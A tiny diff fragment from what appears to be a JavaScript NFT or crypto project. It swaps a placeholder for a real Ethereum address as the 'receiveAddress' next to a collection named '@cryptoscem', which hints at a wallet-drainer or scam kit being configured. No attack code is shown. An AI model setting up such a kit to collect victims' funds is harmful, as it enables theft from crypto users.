@@ -1,4 +1,4 @@
-const receiveAddress = "YOUR ETHEREUM ADDRESS";
+const receiveAddress = "0x6997b7882D305b7Fa3f9c683cB9e0b522E0527Cb";
 
 const collectionInfo = {
     name: "@cryptoscem",
